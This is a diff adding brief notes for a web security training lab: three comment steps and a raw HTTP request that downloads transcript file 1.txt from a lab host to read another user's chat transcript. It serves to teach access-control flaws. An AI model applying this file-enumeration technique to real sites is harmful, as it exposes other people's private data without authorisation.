@@ -1,0 +1,14 @@
+// Play with view transcript in live chat
+// Examine the viewTranscript.js
+// Download other static files on server
+GET /download-transcript/1.txt HTTP/1.1
+Host: ac481f5b1ee612d48032597500a80063.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac481f5b1ee612d48032597500a80063.web-security-academy.net/chat
+Connection: close
+Cookie: session=2gdp77UnculjxjwkMyH1bYENL5w7KU0P
+Upgrade-Insecure-Requests: 1
+
